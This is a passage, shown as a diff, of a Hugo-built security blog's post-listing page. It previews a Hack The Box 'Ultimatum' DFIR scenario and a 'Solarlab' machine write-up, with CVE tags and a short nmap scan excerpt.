+                    <a href="/tags/ultimate">#ultimate</a>
+                
+                    <a href="/tags/ultimatum">#ultimatum</a>
+                
+                    <a href="/tags/worpress">#worpress</a>
+                
+            
+        </p>
+        
+            
+        
+        
+            <div class="articlePreview">
+                <p>
+                    
+                        Ultimatum (DFIR) Scenario One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics.
+                    
+                </p>
+                <p><a href="http://localhost:1313/posts/htb-sherlocks/ultimatum/">Continue reading </a></p>
+            </div>
+        
+    </div>
+    <hr />
+</article>
+<article class="card postlistitem">
+    <div>
+        <h2>
+            <a href="http://localhost:1313/posts/htb-machines/solarlab/">HTB Machine Solarlab</a>
+        </h2>
+        <p class="date">
+            <span title='Date'> </span>
+    2024-05-16
+
+
+                | 
+                <span title='Tags'> </span>
+                
+                    <a href="/tags/ctf">#ctf</a>
+                
+                    <a href="/tags/cve-2023-32315">#CVE-2023-32315</a>
+                
+                    <a href="/tags/cve-2023-33733">#CVE-2023-33733</a>
+                
+                    <a href="/tags/decryptor">#decryptor</a>
+                
+                    <a href="/tags/htb">#htb</a>
+                
+                    <a href="/tags/lab">#lab</a>
+                
+                    <a href="/tags/openfire">#openfire</a>
+                
+                    <a href="/tags/pdf-library">#PDF library</a>
+                
+                    <a href="/tags/reportlab">#ReportLab</a>
+                
+                    <a href="/tags/share">#share</a>
+                
+                    <a href="/tags/smb">#smb</a>
+                
+                    <a href="/tags/solar">#solar</a>
+                
+                    <a href="/tags/windows">#windows</a>
+                
+            
+        </p>
+        
+            
+        
+        
+            <div class="articlePreview">
+                <p>
+                    
+                        Solar Lab - HTB Nmap PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?
+                    
+                </p>
+                <p><a href="http://localhost:1313/posts/htb-machines/solarlab/">Continue reading </a></p>
+            </div>
+        
+    </div>
+    <hr />
+</article>
+
+            </div>
+        </div>
+    
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; Shakil Hossain - All Right Reserved.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
